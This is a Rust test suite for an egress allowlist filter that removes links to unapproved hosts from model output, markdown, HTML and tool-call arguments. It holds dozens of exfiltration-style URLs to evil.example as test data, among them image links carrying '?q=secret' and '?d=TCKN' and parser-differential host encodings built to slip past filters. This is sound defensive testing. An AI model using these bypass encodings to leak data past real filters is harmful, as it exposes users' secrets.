//! Egress allowlist acceptance.
//!
//! The claim: with an allowlist configured, no renderable URL (markdown
//! image or link, autolink, reference definition, HTML `img` / `a`,
//! protocol-relative or `www.` form) whose host is outside the list
//! survives `EgressAllowlist::filter`, whatever the encoding of the host
//! (case, trailing dot, port, userinfo, percent-encoding, fullwidth and
//! ideographic dots, IDN, IPv4 notations, character references, markdown
//! escapes, tab splitting); allowlisted URLs pass unchanged; the streaming
//! adapter equals the batch filter for every chunking, also when it runs
//! behind the streaming guard; and a 200 000-character line is scanned in
//! linear time.

use proptest::prelude::*;
use redactify::guard::egress::{EgressAllowlist, BLOCKED_URL};
use redactify::policy::stream::{GuardEvent, StreamingGuard};
use redactify::policy::{sanitize, GuardAction, GuardTarget};

fn allow() -> EgressAllowlist {
    EgressAllowlist::new([
        "ok.example",
        "*.cdn.example",
        "203.0.113.7",
        "[2001:db8::1]",
    ])
    .expect("valid entries")
}

/// Texts that must come back unchanged.
const ALLOWED: &[&str] = &[
    "![chart](https://ok.example/c.png)",
    "[docs](https://ok.example/guide?x=1#top)",
    "<https://ok.example/a>",
    "[1]: https://ok.example/ref",
    r#"<img src="https://img.cdn.example/i.png" alt="x">"#,
    "<a href='https://ok.example/'>ok</a>",
    "see https://OK.EXAMPLE./path, then",
    "https://ok.example:8443/admin",
    "https://user:pw@ok.example/",
    "http://203.0.113.7/x",
    "http://3405803783/x",
    "http://0xcb.0.0x71.07/x",
    "http://[2001:db8::1]/x",
    "www.img.cdn.example/page",
    "![a](//img.cdn.example/p.png)",
    "&#104;ttps://ok.example/encoded",
    "https&#58;//ok.example/encoded-colon",
    "https\\://ok.example/escaped",
    "visit https://ok%2Eexample/ now",
    "https://\u{FF4F}\u{FF4B}.example/fullwidth",
    "https://ok\u{3002}example/ideographic",
    r#"{"u":"https://ok.example","v":"x"}"#,
    "&lt;https://ok.example/&gt; (an HTML-encoded autolink)",
    "plain prose with no links, a file.txt and a time 10:30",
    "mailto:someone@ok.example is not a fetch",
    "file:///etc/hosts has no host",
    "http:80 is a port number in prose",
];

/// Texts with exactly one URL to a host outside the allowlist.
const BLOCKED: &[&str] = &[
    "![x](https://evil.example/?q=secret)",
    "[click](https://evil.example/)",
    "<https://evil.example/>",
    "[1]: https://evil.example/ref",
    r#"<img src="https://evil.example/p.gif">"#,
    "<a href='http://evil.example'>x</a>",
    "https://EVIL.example./x",
    "https://evil.example:443/x",
    "https://ok.example@evil.example/",
    "https://ok.example:443@evil.example/",
    "https://ok.example\\@evil.example/",
    "https://ok.example%40evil.example/",
    "https://%65vil.example/",
    "https://\u{FF45}vil.example/",
    "https://ok.example\u{3002}evil.example/",
    "https://ok.example\u{FF0E}evil.example/",
    "https://ok.example.evil.example/",
    "https://xn--vil-8la.example/",
    "https://b\u{fc}cher.example/",
    "https://evil.\u{440}\u{444}/",
    "https://cdn.example/apex-is-not-a-subdomain",
    "http://198.51.100.9/",
    "http://3325256713/",
    "http://0xc6.0x33.0x64.0x9/",
    "http://0306.063.0144.011/",
    "http://198.51.25609/",
    "http://[::ffff:198.51.100.9]/",
    "http://[2001:db8::2]/",
    "![a](//evil.example/p.png)",
    r#"<img src="\\evil.example/p.png">"#,
    "<img src=//evil.example/p.png>",
    "background: url(//evil.example/p.png)",
    "www.evil.example/page",
    "&#104;ttps://evil.example/",
    "https&#58;//evil.example/",
    "https&colon;&sol;&sol;evil.example/",
    "https\\://evil.example/",
    "https:\\\\evil.example/",
    "https:/evil.example/",
    "http:evil.example/",
    "ws://evil.example/socket",
    "ftp://evil.example/f",
    "file://evil.example/share",
    "gopher://evil.example/",
    "ht\ttps://evil.example/",
    "<img src=\"https://ok.example\t.evil.example/\">",
    "<img src=\"https://ok.example\r.evil.example/\">",
    "https://ok.example&#9;.evil.example/",
    "https://ok.example).evil.example/",
    "[x](https://ok.example\"x.evil.example)",
    "https://ok.example;x.evil.example/",
    "https://ok.example/r?u=https://evil.example/",
    "&lt;img src=&quot;//evil.example/p.gif&quot;&gt;",
];

#[test]
fn allowed_urls_pass_unchanged() {
    let a = allow();
    for text in ALLOWED {
        let out = a.filter(text);
        assert_eq!(out.text, *text, "false block");
        assert_eq!(out.blocked, 0, "{text}");
        assert!(a.is_clean(text), "{text}");
    }
}

#[test]
fn blocked_urls_are_replaced() {
    let a = allow();
    for text in BLOCKED {
        let out = a.filter(text);
        assert!(out.blocked >= 1, "not blocked: {text:?} -> {:?}", out.text);
        assert!(out.text.contains(BLOCKED_URL), "{text:?} -> {:?}", out.text);
        assert!(!a.is_clean(text), "{text:?}");
        // the output is clean and stable
        assert!(a.is_clean(&out.text), "{text:?} -> {:?}", out.text);
        assert_eq!(a.filter(&out.text).text, out.text, "{text:?}");
        assert!(
            !folded(&out.text).contains("evil"),
            "{text:?} -> {:?}",
            out.text
        );
    }
}

#[test]
fn replacements_keep_the_surrounding_markup() {
    let a = allow();
    let cases = [
        ("![x](https://evil.example/a.png)", "![x]([BLOCKED_URL])"),
        (
            r#"<img src="https://evil.example/a.png">"#,
            r#"<img src="[BLOCKED_URL]">"#,
        ),
        ("see https://evil.example/x.", "see [BLOCKED_URL]."),
        (
            "<https://evil.example/> and <https://ok.example/>",
            "<[BLOCKED_URL]> and <https://ok.example/>",
        ),
    ];
    for (text, want) in cases {
        assert_eq!(a.filter(text).text, want, "{text}");
    }
}

#[test]
fn a_host_split_across_lines_inside_an_attribute_is_judged_joined() {
    // the URL parser deletes the line feed inside an attribute value, so
    // `ok.example` + `\n.evil.example` is the host ok.example.evil.example
    let a = allow();
    let text = "<img src=\"https://ok.example\n.evil.example/p.gif\">";
    let out = a.filter(text);
    assert_eq!(out.text, "<img src=\"https://ok.example\n[BLOCKED_URL]\">");
    assert!(!a.is_clean(text));
    // a continuation that keeps the host allowed (a trailing dot) stays;
    // each line is judged on its own first, so a split inside an allowed
    // name (`img.cdn` + `.example`) is blocked at the first line
    let split = "<img src=\"https://ok.example\n./p.gif\">";
    assert_eq!(a.filter(split).text, split);
    // outside an attribute a line break or a tab ends the URL
    let prose = "docs: https://ok.example\nnext paragraph\thttps://ok.example\t.x";
    assert_eq!(a.filter(prose).text, prose);
    // an empty line inside the attribute is deleted too
    let gap = "<img src=\"https://ok.example\n\n\t.evil.example/p.gif\">";
    assert_eq!(
        a.filter(gap).text,
        "<img src=\"https://ok.example\n\n[BLOCKED_URL]\">"
    );
    // the attribute value is judged as one URL string: the part on a later
    // line that makes the host disallowed is replaced, earlier lines stay
    let user = "<img src=\"https://ok.example\n@evil.example/p.gif\">";
    assert_eq!(
        a.filter(user).text,
        "<img src=\"https://ok.example\n[BLOCKED_URL]\">"
    );
}

/// Parser-differential bypass inputs, with the allowlist
/// `docs.example.com`: a URL parser keeps non-ASCII whitespace inside the
/// authority (so `docs<NBSP>@evil` is userinfo + host evil), deletes ASCII
/// tab and newlines anywhere in a URL, strips leading C0 controls, and
/// HTML decodes a reference after a literal backslash.
const PARSER_BYPASSES: &[&str] = &[
    // (a) non-ASCII whitespace inside the authority
    "![x](https://docs.example.com\u{a0}@evil.example/p.png)",
    "![x](https://docs.example.com\u{2003}@evil.example/p.png)",
    "![x](https://docs.example.com\u{3000}@evil.example/p.png)",
    "![x](https://docs.example.com\u{1680}@evil.example/p.png)",
    "![x](https://docs.example.com\u{85}@evil.example/p.png)",
    "![x](https://docs.example.com&#160;@evil.example/p.png)",
    "![x](https://docs.example.com&#x2003;@evil.example/p.png)",
    "![x](https://docs.example.com&nbsp;@evil.example/p.png)",
    "![x](https://docs.example.com\u{200A}.evil.example/p.png)",
    "<img src=\"https://docs.example.com\u{a0}@evil.example/x\">",
    "<img src=\"https://docs.example.com\u{3000}@evil.example/x\">",
    "<img src=\"https://docs.example.com&#160;@evil.example/x\">",
    "https://docs.example.com\u{3000}@evil.example",
    // (b) raw tab / line feed deleted by the URL parser
    "<img src=\"https://\tevil.example/p.png\">",
    "<img src=\"https:\t//evil.example/p.png\">",
    "<img src=\"https\t://evil.example/p.png\">",
    "<img src=\"https:/\t/evil.example/p.png\">",
    "<img src=\"//\tevil.example/p.png\">",
    "<img src=\"https://\nevil.example/p.png\">",
    "<img src=\"https:\n//evil.example/p.png\">",
    "<img src=\"ht\ntps://evil.example/p.png\">",
    "![x](\n//evil.example/p.png)",
    "[r]:\n//evil.example/p.png\n\n![x][r]",
    "<img src=\n//evil.example/p.png>",
    "<img src=\n\"//evil.example/p.png\">",
    "<img src=\"\n\n//evil.example/p.png\">",
    // (c) a backslash before a character reference (HTML decodes it)
    "<img src=\"https://\\&#101;vil.example/p.png\">",
    "<img src=\"https:\\&#47;evil.example/p.png\">",
    "<img src=\"https:/\\&#47;evil.example/p.png\">",
    // (d) leading C0 controls and spaces
    "<img src=\"\u{c}//evil.example/p.png\">",
    "<img src=\"&#12;//evil.example/p.png\">",
    "<img src=\" \u{1}\u{1f}https://evil.example/p.png \">",
    "<img src=\u{c}//evil.example/p.png>",
    // trailing spaces are stripped too: the host is evil.example
    "<img src=\"https://evil.example \n\">",
];

#[test]
fn parser_bypasses_are_blocked() {
    let a = EgressAllowlist::new(["docs.example.com"]).unwrap();
    for text in PARSER_BYPASSES {
        let out = a.filter(text);
        assert!(out.blocked >= 1, "not blocked: {text:?} -> {:?}", out.text);
        assert!(!a.is_clean(text), "{text:?}");
        assert!(
            !folded(&out.text).contains("evil"),
            "{text:?} -> {:?}",
            out.text
        );
        assert_eq!(a.filter(&out.text).text, out.text, "{text:?}");
        // streaming equals batch at every split
        for i in (0..=text.len()).filter(|&i| text.is_char_boundary(i)) {
            let mut f = a.line_filter();
            let mut s = f.push(&text[..i]);
            s += &f.push(&text[i..]);
            s += &f.finish();
            assert_eq!(s, out.text, "split {i} of {text:?}");
        }
    }
}

#[test]
fn parser_bypasses_in_tool_arguments_are_denied() {
    use redactify::guard::tools::{check, ToolCall, ToolContract};
    let contract = ToolContract::new(&["fetch"])
        .with_egress_allowlist(EgressAllowlist::new(["docs.example.com"]).unwrap());
    let denied = [
        r#"{"url":"https://docs.example.com\u00a0@evil.example/x"}"#,
        r#"{"url":"https://docs.example.com\u3000@evil.example/x"}"#,
        r#"{"url":"https://\tevil.example/x"}"#,
        r#"{"url":"https:\t//evil.example/x"}"#,
        r#"{"url":"https://docs.example.com\n.evil.example/x"}"#,
        r#"{"url":"https://docs.example.com\t.evil.example/x"}"#,
        r#"{"url":"\f//evil.example/x"}"#,
        r#"{"url":" \u0001https://evil.example/x"}"#,
        r#"{"html":"<img src=\"https://\\&#101;vil.example/x\">"}"#,
        "https://\tevil.example/x",
        // duplicate keys: serde keeps the last value, a tool may use the first
        r#"{"url":"https://evil.example/x","url":"https://docs.example.com/x"}"#,
    ];
    for args in denied {
        let v = check(&contract, &[], &ToolCall::new("fetch", args));
        assert_eq!(v.code(), "EGRESS_HOST", "{args}");
    }
    let allowed = [
        r#"{"url":"https://docs.example.com/x"}"#,
        r#"{"url":"https://\tdocs.example.com/x"}"#,
        r#"{"url":"https://docs.example.com\u00a0/x"}"#,
        r#"{"body":"see https://docs.example.com/guide\n\nthanks"}"#,
        r#"{"q":"time 10:30, ratio 1:2"}"#,
        // JSON-escaped slashes of an allowed URL
        r#"{"url":"https:\/\/docs.example.com\/x"}"#,
    ];
    for args in allowed {
        let v = check(&contract, &[], &ToolCall::new("fetch", args));
        assert!(v.is_allow(), "{args}: {}", v.code());
    }
}

/// Allowlisted URLs in shapes that probe for false blocks.
#[test]
fn allowed_shapes_pass_unchanged() {
    let a = EgressAllowlist::new(["docs.example.com", "*.cdn.example.com", "ok.example"]).unwrap();
    let goods = [
        "![x](https://docs.example.com/a.png)",
        "<img src=\"https://img.cdn.example.com/a.png\">",
        "See https://docs.example.com/guide, then https://ok.example.",
        "{\"u\":\"https://docs.example.com/x\",\"v\":1}",
        "[a](https://docs.example.com/a_(b)) text",
        "https://docs.example.com/?q=a&amp;b=c",
        "`https://docs.example.com/x`",
        "**https://docs.example.com/x**",
        "(https://docs.example.com)",
        "'https://docs.example.com'",
        "https://docs.example.com/path\\with\\backslash",
        "C:\\Users\\x\\file.txt and \\\\server\\share",
        "ratio 10:1 http:80 and time 12:30",
        "<img src=\"https://docs.example.com/a.png\"\n alt=\"x\">",
        "<img src=\"https://docs.example.com\n/a.png\">",
        "<img src=\"https://\tdocs.example.com/a.png\">",
        "<img src=\"\u{c} https://docs.example.com/a.png \">",
        "![x](https://docs.example.com\u{a0}x)",
        "visit https://docs.example.com\u{a0}today",
        "https://docs.example.com/a?next=https://ok.example/b",
        "Use std::io::Read; a::b::c",
        "<https://docs.example.com/x>",
        "https://docs.example.com/x&#41;",
        "x = \"not a url\"\ny = \"still prose\"",
        "<p title=\"a // b\">x</p>",
    ];
    for text in goods {
        let out = a.filter(text);
        assert_eq!(out.text, text, "false block");
    }
}

#[test]
fn empty_allowlist_blocks_every_host_and_bad_entries_are_refused() {
    let none = EgressAllowlist::new(Vec::<String>::new()).unwrap();
    assert_eq!(
        none.filter("a https://ok.example b").text,
        "a [BLOCKED_URL] b"
    );
    assert_eq!(none.filter("no links here").text, "no links here");
    for bad in [
        "",
        "*.",
        "b\u{fc}cher.example",
        "a..b",
        "a b",
        "[zz]",
        "*.[::1]",
    ] {
        assert!(EgressAllowlist::new([bad]).is_err(), "{bad:?}");
    }
    let too_many: Vec<String> = (0..=redactify::guard::egress::MAX_EGRESS_ENTRIES)
        .map(|i| format!("h{i}.example"))
        .collect();
    assert!(EgressAllowlist::new(too_many).is_err());
    // canonical entries round-trip
    let a = allow();
    assert_eq!(EgressAllowlist::new(a.entries()).unwrap(), a);
}

/// Lowercase, NFKC, percent- and reference-decoded: an encoded `evil` left
/// in the output would still show up.
fn folded(text: &str) -> String {
    use unicode_normalization::UnicodeNormalization;
    let mut s = text.replace("&#101;", "e").replace("&#x65;", "e");
    let bytes = s.as_bytes();
    let mut out = Vec::with_capacity(bytes.len());
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'%' && i + 2 < bytes.len() {
            if let Ok(b) = u8::from_str_radix(&s[i + 1..i + 3], 16) {
                out.push(b);
                i += 3;
                continue;
            }
        }
        out.push(bytes[i]);
        i += 1;
    }
    s = String::from_utf8_lossy(&out).into_owned();
    s.nfkc().collect::<String>().to_lowercase()
}

// ------------------------------------------------------------ property

/// Hosts as written in a URL that the allowlist accepts.
const OK_HOSTS: &[&str] = &[
    "ok.example",
    "img.cdn.example",
    "OK.EXAMPLE.",
    "ok.example:8443",
    "user@ok.example",
    "203.0.113.7",
];

/// Hosts that must never survive; every one holds `evil` in some encoding
/// that [`folded`] undoes.
const EVIL_HOSTS: &[&str] = &[
    "evil.example",
    "EVIL.example.",
    "evil.example:443",
    "ok.example@evil.example",
    "ok.example\\@evil.example",
    "%65vil.example",
    "\u{FF45}vil.example",
    "ok.example\u{3002}evil.example",
    "ok.example.evil.example",
    "a.evil.example",
];

/// URL shapes: `{}` is the host.
const SHAPES: &[&str] = &[
    "https://{}/p?q=data",
    "http://{}",
    "HTTPS://{}/x",
    "https:\\\\{}/x",
    "&#104;ttps://{}/x",
    "https&#58;//{}/x",
    "https\\://{}/x",
];

/// Shapes that a URL parser reads with the host above, through the
/// characters it deletes or keeps: tabs and line feeds (removed), leading
/// C0 controls (stripped), non-ASCII whitespace in the userinfo (kept), a
/// backslash before a character reference (HTML decodes the reference).
/// Each has the wrappers it is a URL in: `Link` needs a link position,
/// `Attr` a quoted HTML attribute value.
const PARSER_SHAPES: &[(&str, Ctx)] = &[
    ("https://\t{}/x", Ctx::Any),
    ("https:\t//{}/x", Ctx::Any),
    ("https\t://{}/x", Ctx::Attr),
    ("https:/\t/{}/x", Ctx::Any),
    ("https://ok.example\u{a0}@{}/x", Ctx::Any),
    ("https://ok.example\u{3000}@{}/x", Ctx::Any),
    ("https://ok.example\u{2003}@{}/x", Ctx::Any),
    ("https://ok.example&#160;@{}/x", Ctx::Any),
    ("https:\\&#47;{}/x", Ctx::Any),
    ("//\t{}/x", Ctx::Link),
    ("\u{c}//{}/x", Ctx::Link),
    ("&#12;//{}/x", Ctx::Link),
    ("https://\n{}/x", Ctx::Attr),
    ("https:\n//{}/x", Ctx::Attr),
    ("ht\ntps://{}/x", Ctx::Attr),
    (" \u{1}https://{}/x \u{1f}", Ctx::Attr),
];

/// Where a shape is a URL.
#[derive(Clone, Copy, PartialEq)]
enum Ctx {
    Any,
    Link,
    Attr,
}

/// Renderable wrappers: `{}` is the URL.
const WRAPPERS: &[&str] = &[
    "{}",
    "![alt]({})",
    "[text]({})",
    "<{}>",
    "[ref]: {}",
    "<img src=\"{}\">",
    "<a href='{}'>x</a>",
];

const SEPARATORS: &[&str] = &[" ", "\n", " and ", "\t", ". ", "\r\n"];

fn piece() -> impl Strategy<Value = (String, bool)> {
    (
        any::<bool>(),
        0..OK_HOSTS.len().max(EVIL_HOSTS.len()),
        0..SHAPES.len() + PARSER_SHAPES.len(),
        0..WRAPPERS.len(),
    )
        .prop_map(|(evil, h, s, w)| {
            let host = if evil {
                EVIL_HOSTS[h % EVIL_HOSTS.len()]
            } else {
                OK_HOSTS[h % OK_HOSTS.len()]
            };
            let (shape, ctx) = SHAPES.get(s).map_or_else(
                || PARSER_SHAPES[s - SHAPES.len()],
                |&shape| (shape, Ctx::Any),
            );
            // WRAPPERS[0] is bare (no link position), 5 and 6 are quoted
            // attribute values
            let wrapper = match ctx {
                Ctx::Any => WRAPPERS[w],
                Ctx::Link if w == 0 => WRAPPERS[1],
                Ctx::Link => WRAPPERS[w],
                Ctx::Attr => WRAPPERS[5 + w % 2],
            };
            let url = shape.replace("{}", host);
            (wrapper.replace("{}", &url), evil)
        })
}

fn text_strategy() -> impl Strategy<Value = (String, Vec<(String, bool)>)> {
    prop::collection::vec((piece(), 0..SEPARATORS.len()), 1..8).prop_map(|parts| {
        let mut text = String::new();
        let mut pieces = Vec::new();
        for ((p, evil), sep) in parts {
            text.push_str(&p);
            text.push_str(SEPARATORS[sep]);
            pieces.push((p, evil));
        }
        (text, pieces)
    })
}

proptest! {
    #![proptest_config(ProptestConfig { cases: 2000, ..ProptestConfig::default() })]

    /// No evil host survives in any shape, wrapper or encoding; every
    /// allowed piece survives verbatim; the output is clean and stable.
    #[test]
    fn no_disallowed_url_survives((text, pieces) in text_strategy()) {
        let a = allow();
        let out = a.filter(&text);
        prop_assert!(!folded(&out.text).contains("evil"), "{:?} -> {:?}", text, out.text);
        prop_assert_eq!(&a.filter(&out.text).text, &out.text);
        for (p, evil) in &pieces {
            if !evil {
                prop_assert!(out.text.contains(p.as_str()), "allowed piece lost: {:?} in {:?} -> {:?}", p, text, out.text);
            }
        }
        prop_assert_eq!(out.blocked == 0, pieces.iter().all(|(_, evil)| !evil));
    }

    /// The streaming adapter equals the batch filter for any chunking.
    #[test]
    fn line_filter_equals_batch((text, _) in text_strategy(), cuts in prop::collection::vec(any::<prop::sample::Index>(), 0..6)) {
        let a = allow();
        let batch = a.filter(&text);
        let mut bounds: Vec<usize> = cuts.iter().map(|i| i.index(text.len() + 1)).collect();
        bounds.sort_unstable();
        bounds.retain(|&b| text.is_char_boundary(b));
        let mut f = a.line_filter();
        let mut out = String::new();
        let mut at = 0;
        for b in bounds {
            out.push_str(&f.push(&text[at..b]));
            at = b;
        }
        out.push_str(&f.push(&text[at..]));
        out.push_str(&f.finish());
        prop_assert_eq!(&out, &batch.text);
        prop_assert_eq!(f.blocked(), batch.blocked);
    }
}

// ------------------------------------------- composition with the stream

/// Model outputs that do not block (so the stream emits everything).
const MODEL_OUTPUTS: &[&str] = &[
    "Here is the chart: ![c](https://evil.example/c.png?d=TCKN)\nand the docs at https://ok.example/guide.\n",
    "<img src=\"//evil.example/p.gif\"> plus <a href=\"https://ok.example/\">ok</a>",
    "line one\n[ref]: https://ok.example@evil.example/x\nline three www.evil.example/y",
    "mail a@b.com and see <https://img.cdn.example/i.png>\n\nhttps://evil.example",
];

#[test]
fn filter_behind_the_streaming_guard_equals_batch_at_every_split() {
    let a = allow();
    let target = GuardTarget::ModelOutput;
    let mut cases = 0;
    for text in MODEL_OUTPUTS {
        let batch = sanitize(text, &target);
        assert_ne!(batch.decision.action, GuardAction::Block, "{text}");
        let want = a.filter(&batch.text).text;
        assert!(!folded(&want).contains("evil"), "{want}");
        for split in (0..=text.len()).filter(|&i| text.is_char_boundary(i)) {
            let mut sg = StreamingGuard::new(target);
            let mut f = a.line_filter();
            let mut out = String::new();
            for chunk in [&text[..split], &text[split..]] {
                for ev in sg.push(chunk) {
                    if let GuardEvent::Segment { text, .. } = ev {
                        out.push_str(&f.push(&text));
                    }
                }
            }
            for ev in sg.finish() {
                if let GuardEvent::Segment { text, .. } = ev {
                    out.push_str(&f.push(&text));
                }
            }
            out.push_str(&f.finish());
            assert_eq!(out, want, "split at {split} of {text:?}");
            cases += 1;
        }
    }
    assert!(cases > 200, "{cases}");
}

// ------------------------------------------------------- long lines

/// 200 000-character lines built to stress every scanner path: dense URL
/// starts, long authorities, many cut characters, character references,
/// backslashes, parentheses. Each must finish quickly (linear scan) and
/// leave a clean output.
#[test]
fn long_lines_scan_in_linear_time() {
    const LEN: usize = 200_000;
    let a = EgressAllowlist::new(["a", "*.a", "ok.example"]).unwrap();
    let units = [
        "http:a\\",
        "(www.x.a\\",
        "https://ok.example/",
        "https://ok.example\"",
        "&#104;ttps://",
        "//x.a(",
        "a.a\"a.a\"",
        "))))))))",
        "\\\\\\\\",
        ":::::",
        "https://evil.example/",
        "x",
    ];
    for unit in units {
        let line: String = unit.repeat(LEN / unit.len() + 1)[..LEN].to_owned();
        let line = if line.is_char_boundary(LEN) {
            line
        } else {
            line.chars().take(LEN).collect()
        };
        let start = std::time::Instant::now();
        let out = a.filter(&line);
        let clean = a.is_clean(&out.text);
        let elapsed = start.elapsed();
        assert!(clean, "{unit}");
        // generous bound for an unoptimized test build on a shared machine;
        // the measured release numbers are in the report
        assert!(
            elapsed < std::time::Duration::from_secs(5),
            "{unit}: {elapsed:?}"
        );
    }
}

/// Release timings of the filter (run alone: `cargo test --release --test
/// egress_allowlist -- --ignored --nocapture measure`).
#[test]
#[ignore = "measurement: prints numbers, run alone in release"]
fn measure_filter_cost() {
    const LEN: usize = 200_000;
    let a = EgressAllowlist::new(["a", "*.a", "ok.example"]).unwrap();
    let time = |label: &str, text: &str| {
        let runs = 20;
        let start = std::time::Instant::now();
        let mut blocked = 0;
        for _ in 0..runs {
            blocked = std::hint::black_box(a.filter(text)).blocked;
        }
        let per = start.elapsed().as_secs_f64() / f64::from(runs);
        println!(
            "{label}: {:.3} ms per {} bytes ({:.0} MB/s), {blocked} replaced",
            per * 1e3,
            text.len(),
            text.len() as f64 / per / 1e6
        );
    };
    let prose = "The quarterly report is attached; see https://ok.example/docs for details \
                 and ![chart](https://ok.example/c.png). Nothing else to add here.\n";
    time(
        "prose with allowed links",
        &prose.repeat(1_000_000 / prose.len()),
    );
    let plain = "The quarterly report is attached and nothing else needs to be added here.\n";
    time(
        "prose without links",
        &plain.repeat(1_000_000 / plain.len()),
    );
    for unit in [
        "http:a\\",
        "(www.x.a\\",
        "https://ok.example/",
        "a.a\"a.a\"",
        "&#104;ttps://",
        "))))))))",
        "https://evil.example/",
        "x",
    ] {
        let line: String = unit.repeat(LEN / unit.len() + 1)[..LEN].to_owned();
        time(&format!("200k line of {unit:?}"), &line);
    }
}
